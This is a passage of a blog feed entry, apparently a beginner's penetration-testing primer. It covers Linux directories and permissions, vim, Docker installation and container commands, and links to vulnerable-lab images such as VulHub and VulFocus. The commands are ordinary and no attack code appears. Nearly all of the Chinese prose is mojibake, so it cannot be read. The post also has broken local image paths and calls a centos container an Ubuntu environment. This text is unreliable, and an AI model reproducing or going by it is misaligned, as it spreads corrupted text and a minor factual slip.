requirements_utf8.txt</code></pre></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æ¸—é€åŸºç¡€</title>
    <link href="/2024/11/14/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/11/14/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h3 id="Linuxä½¿ç”¨åŸºç¡€"><a href="#Linuxä½¿ç”¨åŸºç¡€" class="headerlink" title="Linuxä½¿ç”¨åŸºç¡€"></a>Linuxä½¿ç”¨åŸºç¡€</h3><p>Linuxä½¿ç”¨åŸºç¡€</p><p>![image-20250418110229353](F:\new myblog\STUDY\source\img\image-20250418110229353.png)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ï¼š<br>æ ¹ç›®å½•ï¼Œæ¯ä¸€ä¸ªæ–‡ä»¶å’Œç›®å½•éƒ½ä»è¿™é‡Œå¼€å§‹ã€‚åªæœ‰rootç”¨æˆ·å…·æœ‰è¯¥ç›®å½•ä¸‹çš„å†™æƒé™ã€‚<br>/binï¼š<br>ç”¨æˆ·äºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒåŒ…å«äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ã€‚ç³»ç»Ÿçš„æ‰€æœ‰ç”¨æˆ·ä½¿ç”¨çš„å‘½ä»¤éƒ½è®¾åœ¨è¿™é‡Œï¼Œä¾‹å¦‚ï¼špsï¼Œ<span class="hljs-built_in">ls</span>ï¼Œpingï¼Œ<br>grepï¼Œ<span class="hljs-built_in">cp</span>ç­‰ã€‚<br>/bootï¼š<br>è¿™é‡Œå­˜æ”¾çš„æ˜¯å¯åŠ¨Linuxæ—¶ä½¿ç”¨çš„ä¸€äº›æ ¸å¿ƒæ–‡ä»¶ï¼ŒåŒ…æ‹¬ä¸€äº›è¿æ¥æ–‡ä»¶ä»¥åŠé•œåƒæ–‡ä»¶ã€‚<br>/dev ï¼š<br>è®¾å¤‡æ–‡ä»¶ï¼Œdevæ˜¯Device(è®¾å¤‡)çš„ç¼©å†™, è¯¥ç›®å½•ä¸‹å­˜æ”¾çš„æ˜¯Linuxçš„å¤–éƒ¨è®¾å¤‡ï¼Œåœ¨Linuxä¸­è®¿é—®è®¾å¤‡çš„æ–¹å¼<br>å’Œè®¿é—®æ–‡ä»¶çš„æ–¹å¼æ˜¯ç›¸åŒçš„ã€‚<br>/etcï¼š<br>è¿™ä¸ªç›®å½•ç”¨æ¥å­˜æ”¾æ‰€æœ‰çš„ç³»ç»Ÿç®¡ç†æ‰€éœ€è¦çš„é…ç½®æ–‡ä»¶å’Œå­ç›®å½•ã€‚<br>/homeï¼š<br>ç”¨æˆ·çš„ä¸»ç›®å½•ï¼Œåœ¨Linuxä¸­ï¼Œæ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„ç›®å½•ï¼Œä¸€èˆ¬è¯¥ç›®å½•åæ˜¯ä»¥ç”¨æˆ·çš„è´¦å·å‘½åçš„ã€‚<br>/libï¼š<br>è¿™ä¸ªç›®å½•é‡Œå­˜æ”¾ç€ç³»ç»Ÿæœ€åŸºæœ¬çš„åŠ¨æ€è¿æ¥å…±äº«åº“ï¼Œå…¶ä½œç”¨ç±»ä¼¼äºWindowsé‡Œçš„DLLæ–‡ä»¶ã€‚å‡ ä¹æ‰€æœ‰çš„åº”ç”¨ç¨‹åº<br>éƒ½éœ€è¦ç”¨åˆ°è¿™äº›å…±äº«åº“ã€‚<br>/rootï¼š<br>è¯¥ç›®å½•ä¸ºç³»ç»Ÿç®¡ç†å‘˜ï¼Œä¹Ÿç§°ä½œè¶…çº§æƒé™è€…çš„ç”¨æˆ·ä¸»ç›®å½•ã€‚<br>/usr/binï¼š<br>ç³»ç»Ÿç”¨æˆ·ä½¿ç”¨çš„åº”ç”¨ç¨‹åºã€‚<br>/optï¼š<br>å¯é€‰çš„é™„åŠ åº”ç”¨ç¨‹åºï¼Œè¿™æ˜¯ç»™ä¸»æœºé¢å¤–å®‰è£…è½¯ä»¶æ‰€æ‘†æ”¾çš„ç›®å½•ã€‚æ¯”å¦‚ä½ å®‰è£…ä¸€ä¸ªORACLEæ•°æ®åº“å°±å¯ä»¥æ”¾åˆ°è¿™ä¸ª<br>ç›®å½•ä¸‹ã€‚é»˜è®¤æ˜¯ç©ºçš„ã€‚<br>/sbinï¼š<br>så°±æ˜¯Super Userçš„æ„æ€ï¼Œç³»ç»ŸäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåœ¨è¿™ä¸ªç›®å½•ä¸‹çš„linuxå‘½ä»¤é€šå¸¸ç”±ç³»ç»Ÿç®¡ç†å‘˜ä½¿ç”¨ã€‚<br>/usrï¼š<br>è¿™æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„ç›®å½•ï¼Œç”¨æˆ·çš„å¾ˆå¤šåº”ç”¨ç¨‹åºå’Œæ–‡ä»¶éƒ½æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼Œç±»ä¼¼äºwindowsä¸‹çš„program <br>filesç›®å½•ã€‚<br>/usr/sbinï¼š<br>è¶…çº§ç”¨æˆ·ä½¿ç”¨çš„æ¯”è¾ƒé«˜çº§çš„ç®¡ç†ç¨‹åºå’Œç³»ç»Ÿå®ˆæŠ¤ç¨‹åºã€‚<br>/tmpï¼š<br>è¿™ä¸ªç›®å½•æ˜¯ç”¨æ¥å­˜æ”¾ä¸€äº›ä¸´æ—¶æ–‡ä»¶çš„ã€‚<br>/varï¼š<br>è¿™ä¸ªç›®å½•ä¸­å­˜æ”¾ç€åœ¨ä¸æ–­æ‰©å……ç€çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬ä¹ æƒ¯å°†é‚£äº›ç»å¸¸è¢«ä¿®æ”¹çš„ç›®å½•æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹ã€‚åŒ…æ‹¬å„ç§æ—¥å¿—æ–‡<br>ä»¶<br></code></pre></td></tr></table></figure><p>æ–‡ä»¶å±æ€§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">rï¼š4<br> wï¼š2<br> xï¼š1<br>å±ä¸»ï¼šuï¼ˆuserï¼‰<br>æ•°ç»„ï¼šgï¼ˆgroupï¼‰<br>å…¶ä»–ï¼šoï¼ˆotherï¼‰<br><span class="hljs-built_in">chmod</span> u+x <span class="hljs-built_in">test</span><br><span class="hljs-built_in">chown</span> root.root <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>![image-20250418110404835](F:\new myblog\STUDY\source\img\image-20250418110404835.png)</p><p>æ–‡ä»¶ç›®å½•ç®¡ç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br> <span class="hljs-built_in">cd</span><br> <span class="hljs-built_in">pwd</span><br> <span class="hljs-built_in">mkdir</span><br> <span class="hljs-built_in">rmdir</span><br> <span class="hljs-built_in">cp</span><br> <span class="hljs-built_in">rm</span><br> <span class="hljs-built_in">mv</span><br>ç»å¯¹è·¯å¾„ï¼šç”±æ ¹ç›®å½•å†™èµ· root@kali:~# <span class="hljs-built_in">cd</span> /var/www/html<br>ç›¸å¯¹è·¯å¾„ï¼šä¸æ˜¯ç”±æ ¹å†™èµ· root@kali:/var/www/html# <span class="hljs-built_in">cd</span> ../../log/<br><br></code></pre></td></tr></table></figure><h3 id="VIMç¼–è¾‘å™¨"><a href="#VIMç¼–è¾‘å™¨" class="headerlink" title="VIMç¼–è¾‘å™¨"></a>VIMç¼–è¾‘å™¨</h3><p>![image-20250418110606597](F:\new myblog\STUDY\source\img\image-20250418110606597.png)</p><ol><li>å‘½ä»¤æ¨¡å¼ ç”¨æˆ·åˆšåˆšå¯åŠ¨ vi&#x2F;vimï¼Œä¾¿è¿›å…¥äº†å‘½ä»¤æ¨¡å¼ã€‚ æ­¤çŠ¶æ€ä¸‹æ•²å‡»é”®ç›˜åŠ¨ä½œä¼šè¢«Vimè¯†åˆ«ä¸ºå‘½ä»¤ï¼Œè€Œéè¾“å…¥å­—ç¬¦ã€‚æ¯”å¦‚æˆ‘ä»¬æ­¤æ—¶æŒ‰ä¸‹iï¼Œå¹¶ä¸ä¼šè¾“å…¥ä¸€ä¸ªå­— ç¬¦ï¼Œiè¢«å½“ä½œäº†ä¸€ä¸ªå‘½ä»¤ã€‚ </li><li>è¾“å…¥æ¨¡å¼ è¿›è¡ŒVIMè¾“å…¥æ¨¡å¼çš„æ–¹å¼æ˜¯åœ¨å‘½ä»¤æ¨¡å¼çŠ¶æ€ä¸‹è¾“å…¥ iã€Iã€aã€Aã€oã€O ç­‰æ’å…¥å‘½ä»¤ åœ¨è¾“å…¥æ¨¡å¼ä¸‹ï¼ŒVim å¯ä»¥å¯¹æ–‡ä»¶æ‰§è¡Œå†™æ“ä½œï¼Œç±»ä¼¼äºåœ¨ Windows ç³»ç»Ÿçš„æ–‡æ¡£ä¸­è¾“å…¥å†…å®¹ã€‚ </li><li>åº•çº¿å‘½ä»¤æ¨¡å¼ åœ¨å‘½ä»¤æ¨¡å¼ä¸‹æŒ‰ä¸‹ â€œ:â€(è‹±æ–‡å†’å·)å°±è¿›å…¥äº†åº•çº¿å‘½ä»¤æ¨¡å¼ã€‚ åº•çº¿å‘½ä»¤æ¨¡å¼å¯ä»¥è¾“å…¥å•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦çš„å‘½ä»¤ï¼Œå¯ç”¨çš„å‘½ä»¤éå¸¸å¤šã€‚ åœ¨åº•çº¿å‘½ä»¤æ¨¡å¼ä¸­ï¼ŒåŸºæœ¬çš„å‘½ä»¤æœ‰(å·²ç»çœç•¥äº†å†’å·)ï¼š  q é€€å‡ºç¨‹åº  w ä¿å­˜æ–‡ä»¶  æŒ‰ESCé”®å¯éšæ—¶é€€å‡ºåº•çº¿å‘½ä»¤æ¨¡å¼ã€‚</li></ol><h2 id="Dockeræ“ä½œ"><a href="#Dockeræ“ä½œ" class="headerlink" title="Dockeræ“ä½œ"></a>Dockeræ“ä½œ</h2><p>Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼Œè®©å¼€å‘è€…å¯ä»¥æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ ä¸ªå¯ç§»æ¤çš„å®¹å™¨ä¸­,ç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„Linuxæœºå™¨æˆ–Windows æœºå™¨ä¸Š,ä¹Ÿå¯ä»¥å®ç° è™šæ‹ŸåŒ–,å®¹å™¨æ˜¯å®Œå…¨ä½¿ç”¨æ²™ç®±æœºåˆ¶,ç›¸äº’ä¹‹é—´ä¸ä¼šæœ‰ä»»ä½•æ¥å£</p><h3 id="Docker-ç¯å¢ƒå®‰è£…ä¸åŸºæœ¬æ“ä½œæ•´ç†"><a href="#Docker-ç¯å¢ƒå®‰è£…ä¸åŸºæœ¬æ“ä½œæ•´ç†" class="headerlink" title="Docker ç¯å¢ƒå®‰è£…ä¸åŸºæœ¬æ“ä½œæ•´ç†"></a>Docker ç¯å¢ƒå®‰è£…ä¸åŸºæœ¬æ“ä½œæ•´ç†</h3><ol><li><strong>å®‰è£… Docker</strong></li></ol><ul><li><p><strong>æ·»åŠ  Docker PGP key</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -fsSL https:<span class="hljs-regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="hljs-regexp">/docker-ce/</span>linux<span class="hljs-regexp">/debian/g</span>pg | sudo apt-key add -<br></code></pre></td></tr></table></figure></li><li><p><strong>é…ç½® Docker APT repository</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker.list<br></code></pre></td></tr></table></figure></li><li><p><strong>æ›´æ–° APT åŒ…åˆ—è¡¨</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br></code></pre></td></tr></table></figure></li><li><p><strong>å¸è½½æ—§ç‰ˆæœ¬ Docker</strong></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">sudo apt <span class="hljs-built_in">remove</span> docker docker-engine docker.<span class="hljs-built_in">io</span><br></code></pre></td></tr></table></figure></li><li><p><strong>å®‰è£… Docker</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install docker-ce<br></code></pre></td></tr></table></figure></li><li><p><strong>æŸ¥çœ‹ Docker çŠ¶æ€</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl status docker</span><br></code></pre></td></tr></table></figure></li><li><p><strong>å¯åŠ¨ Docker</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> docker<br></code></pre></td></tr></table></figure></li><li><p><strong>è®¾ç½® Docker å¼€æœºè‡ªåŠ¨å¯åŠ¨</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">systemctl <span class="hljs-built_in">enable</span> docker<br></code></pre></td></tr></table></figure></li></ul><ol start="2"><li><strong>å®‰è£… Docker Compose</strong></li></ol><ul><li><p>ä¸‹è½½å¹¶å®‰è£… Docker Compose</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -L https:<span class="hljs-regexp">//g</span>et.daocloud.io<span class="hljs-regexp">/docker/</span>compose<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/v2.1.0/</span>docker-compose-$(uname -s)-$(uname -m) &gt; <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>docker-compose<br>chmod +x <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>docker-compose<br></code></pre></td></tr></table></figure></li></ul><ol start="3"><li><strong>Docker é•œåƒæ“ä½œ</strong></li></ol><ul><li><p><strong>åˆ—å‡ºé•œåƒ</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker <span class="hljs-selector-tag">image</span> ls -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure></li><li><p><strong>æ‹‰å–é•œåƒ</strong></p><p>Dockerç»´æŠ¤äº†é•œåƒä»“åº“ï¼Œåˆ†ä¸ºå…±æœ‰å’Œç§æœ‰ä¸¤ç§ï¼Œå…±æœ‰çš„å®˜æ–¹ä»“åº“Docker Hub(<a href="https://hub.docker.com/)%E6%98%AF%E6%9C%80%E9%87%8D%E8%A6%81%E6%9C%80%E5%B8%B8%E7%94%A8%E7%9A%84%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93%E3%80%82%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93%EF%BC%88Private">https://hub.docker.com/)æ˜¯æœ€é‡è¦æœ€å¸¸ç”¨çš„é•œåƒä»“åº“ã€‚ç§æœ‰ä»“åº“ï¼ˆPrivate</a> Registryï¼‰æ˜¯å¼€å‘è€…æˆ–è€…ä¼ä¸šè‡ªå»ºçš„é•œåƒå­˜å‚¨åº“ï¼Œé€šå¸¸ç”¨æ¥ä¿å­˜ä¼ä¸š å†…éƒ¨çš„ Docker é•œåƒï¼Œç”¨äºå†…éƒ¨å¼€å‘æµç¨‹å’Œäº§å“çš„å‘å¸ƒã€ç‰ˆæœ¬æ§åˆ¶ã€‚</p><p>è¦æƒ³è·å–æŸä¸ªé•œåƒï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨pullå‘½ä»¤ï¼Œä»ä»“åº“ä¸­æ‹‰å–é•œåƒåˆ°æœ¬åœ°ï¼Œå¦‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"> docker <span class="hljs-selector-tag">image</span> pull library/hello-world<br> <br> ä¸Šé¢ä»£ç ä¸­ï¼Œdocker <span class="hljs-selector-tag">image</span> pullæ˜¯æŠ“å– <span class="hljs-selector-tag">image</span> æ–‡ä»¶çš„å‘½ä»¤ã€‚library/hello-worldæ˜¯ <span class="hljs-selector-tag">image</span> æ–‡ä»¶åœ¨ä»“åº“é‡Œé¢çš„ä½ç½®ï¼Œå…¶ä¸­libraryæ˜¯ <span class="hljs-selector-tag">image</span> æ–‡ä»¶æ‰€åœ¨çš„ç»„ï¼Œhello-worldæ˜¯ <span class="hljs-selector-tag">image</span> æ–‡ä»¶çš„åå­—ã€‚<br><br>ç”±äº Docker å®˜æ–¹æä¾›çš„ <span class="hljs-selector-tag">image</span> æ–‡ä»¶ï¼Œéƒ½æ”¾åœ¨libraryç»„é‡Œé¢ï¼Œæ‰€ä»¥å®ƒçš„æ˜¯é»˜è®¤ç»„ï¼Œå¯ä»¥çœç•¥ã€‚å› æ­¤ï¼Œä¸Šé¢çš„å‘½ä»¤å¯ä»¥å†™æˆä¸‹é¢è¿™æ ·ã€‚<br> docker <span class="hljs-selector-tag">image</span> pull hello-world<br></code></pre></td></tr></table></figure></li><li><p><strong>åˆ é™¤é•œåƒ</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker image <span class="hljs-built_in">rm</span> é•œåƒåæˆ–é•œåƒ<span class="hljs-built_in">id</span><br>docker rmi é•œåƒåæˆ–é•œåƒ<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure></li></ul><ol start="4"><li><strong>Docker å®¹å™¨æ“ä½œ</strong></li></ol><ul><li><p><strong>åˆ›å»ºå®¹å™¨</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker run <span class="hljs-selector-attr">[options]</span> é•œåƒå <span class="hljs-selector-attr">[å‘½ä»¤]</span><br></code></pre></td></tr></table></figure><p>å¸¸ç”¨å‚æ•°ï¼š</p><ul><li><code>-i</code>ï¼šä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨</li><li><code>-t</code>ï¼šåˆ†é…ä¼ªç»ˆç«¯</li><li><code>--name</code>ï¼šæŒ‡å®šå®¹å™¨åç§°</li><li><code>-v</code>ï¼šç›®å½•æ˜ å°„</li><li><code>-d</code>ï¼šä»¥å®ˆæŠ¤æ¨¡å¼è¿è¡Œå®¹å™¨</li><li><code>-p</code>ï¼šç«¯å£æ˜ å°„</li><li><code>-e</code>ï¼šè®¾ç½®ç¯å¢ƒå˜é‡</li><li><code>--network=host</code>ï¼šå°†ä¸»æœºç½‘ç»œç¯å¢ƒæ˜ å°„åˆ°å®¹å™¨</li></ul></li><li><p><strong>åˆ›å»ºäº¤äº’å¼å®¹å™¨</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> -it <span class="hljs-attribute">--name</span>=mycentos centos /bin/bash<br></code></pre></td></tr></table></figure><p>åœ¨å®¹å™¨ä¸­å¯ä»¥éšæ„æ‰§è¡Œlinuxå‘½ä»¤ï¼Œå°±æ˜¯ä¸€ä¸ªubuntuçš„ç¯å¢ƒï¼Œå½“æ‰§è¡Œexitå‘½ä»¤é€€å‡ºæ—¶ï¼Œè¯¥å®¹å™¨ä¹Ÿéšä¹‹åœæ­¢ã€‚</p></li><li><p><strong>åˆ›å»ºå®ˆæŠ¤å¼å®¹å™¨</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> -dit <span class="hljs-attribute">--name</span>=mycentos2 centos<br></code></pre></td></tr></table></figure><p>å¦‚æœå¯¹äºä¸€ä¸ªéœ€è¦é•¿æœŸè¿è¡Œçš„å®¹å™¨æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªå®ˆæŠ¤å¼å®¹å™¨ã€‚åœ¨å®¹å™¨å†…éƒ¨exité€€å‡ºæ—¶ï¼Œå®¹å™¨ä¹Ÿä¸ä¼šåœæ­¢ã€‚</p></li><li><p><strong>è¿›å…¥è¿è¡Œä¸­çš„å®¹å™¨</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it å®¹å™¨åæˆ–å®¹å™¨<span class="hljs-built_in">id</span> /bin/bash<br></code></pre></td></tr></table></figure></li><li><p><strong>æŸ¥çœ‹å®¹å™¨</strong></p><ul><li><p>æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">docker <span class="hljs-keyword">container</span> <span class="hljs-keyword">ls</span><br></code></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹æ‰€æœ‰å®¹å™¨ï¼ˆåŒ…æ‹¬å·²åœæ­¢çš„ï¼‰ï¼š</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">docker container <span class="hljs-keyword">ls</span> <span class="hljs-params">--all</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>åœæ­¢å’Œå¯åŠ¨å®¹å™¨</strong></p><ul><li><p>åœæ­¢å®¹å™¨ï¼š</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker container stop å®¹å™¨åæˆ–å®¹å™¨<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure></li><li><p>å¯åŠ¨å®¹å™¨ï¼š</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">docker container <span class="hljs-keyword">start</span> å®¹å™¨åæˆ–å®¹<span class="hljs-built_in">å™¨id</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>å¼ºåˆ¶åœæ­¢å®¹å™¨ï¼ˆkillï¼‰</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker container <span class="hljs-built_in">kill</span> å®¹å™¨åæˆ–å®¹å™¨<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure></li><li><p><strong>åˆ é™¤å®¹å™¨</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker container <span class="hljs-built_in">rm</span> å®¹å™¨åæˆ–å®¹å™¨<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure></li></ul><ol start="5"><li><strong>å®¹å™¨ä¿å­˜ä¸ºé•œåƒ</strong></li></ol><ul><li><p>ä¿å­˜å®¹å™¨ä¸ºé•œåƒ</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> commit å®¹å™¨å é•œåƒå<br></code></pre></td></tr></table></figure></li></ul><ol start="6"><li><strong>é•œåƒå¤‡ä»½ä¸è¿ç§»</strong></li></ol><ul><li><p><strong>å°†é•œåƒä¿å­˜ä¸ºæ–‡ä»¶</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">docker save -o <span class="hljs-string">./</span>é•œåƒæ–‡ä»¶<span class="hljs-string">.tar</span> é•œåƒå<br></code></pre></td></tr></table></figure></li><li><p><strong>åŠ è½½é•œåƒæ–‡ä»¶</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">docker load -i <span class="hljs-string">./</span>é•œåƒæ–‡ä»¶<span class="hljs-string">.tar</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="Docker-æ­å»ºæ¼æ´é¶åœº"><a href="#Docker-æ­å»ºæ¼æ´é¶åœº" class="headerlink" title="Docker æ­å»ºæ¼æ´é¶åœº"></a>Docker æ­å»ºæ¼æ´é¶åœº</h3><ol><li><strong>VulHub</strong></li></ol><p>VulHub æä¾›äº†å¤šä¸ªæ¼æ´é¶åœºçš„ Docker é•œåƒï¼Œæ¶µç›–äº† Web åº”ç”¨ã€ç½‘ç»œæœåŠ¡ç­‰å„ç§ç±»å‹çš„æ¼æ´ã€‚</p><ul><li><strong>GitHub ä»“åº“</strong>:<br><a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></li><li><strong>Docker Hub é•œåƒ</strong>:<br><a href="https://hub.docker.com/u/vulhub">https://hub.docker.com/u/vulhub</a></li></ul><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><ol><li><p>æ‹‰å–å¹¶å¯åŠ¨æ‰€éœ€æ¼æ´é¶åœºé•œåƒ</p></li><li><p>æ ¹æ®ä»“åº“ä¸­çš„æ–‡æ¡£é…ç½®å¹¶è¿è¡Œæ¼æ´é¶åœºã€‚</p></li><li><p><strong>VulApps</strong></p></li></ol><p>VulApps æ˜¯ä¸€ä¸ªè½»é‡çº§çš„æ¼æ´é¶åœºé¡¹ç›®ï¼ŒåŒ…å«ä¸€äº›ç»å…¸çš„æ¼æ´åœºæ™¯ï¼Œé€‚åˆåˆå­¦è€…è¿›è¡Œæ¼æ´ç ”ç©¶ã€‚</p><ul><li><strong>GitHub ä»“åº“</strong>:<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a></li><li><strong>Docker Hub é•œåƒ</strong>:<br><a href="https://hub.docker.com/r/medicean/vulapps">https://hub.docker.com/r/medicean/vulapps</a></li></ul><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><ol><li><p>åœ¨ Docker ä¸Šå¯åŠ¨ <code>vulapps</code> é•œåƒã€‚</p></li><li><p>æ ¹æ®éœ€æ±‚é€‰æ‹©ç›¸åº”çš„æ¼æ´åœºæ™¯ã€‚</p></li><li><p><strong>VulFocus</strong></p></li></ol><p>VulFocus æ˜¯ä¸€ä¸ªæ¼æ´é¶åœºå¹³å°ï¼Œæä¾›äº†ä¸€ç³»åˆ— Web æ¼æ´æ¨¡æ‹Ÿç¯å¢ƒã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡å¹³å°é€‰æ‹©ä¸åŒçš„æ¼æ´ç±»å‹å’Œç‰ˆæœ¬è¿›è¡Œæµ‹è¯•ã€‚</p><ul><li><strong>GitHub ä»“åº“</strong>:<br><a href="https://github.com/fofapro/vulfocus">https://github.com/fofapro/vulfocus</a></li><li><strong>å¹³å°ç½‘å€</strong>:<br><a href="http://vulfocus.fofa.so/#/">http://vulfocus.fofa.so/#/</a></li><li><strong>Docker Hub é•œåƒ</strong>:<br><a href="https://hub.docker.com/u/vulfocu">https://hub.docker.com/u/vulfocu</a></li></ul><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><ol><li>ä½¿ç”¨ Docker å¯åŠ¨ä¸åŒçš„æ¼æ´ç¯å¢ƒã€‚</li><li>æ ¹æ®ç›®æ 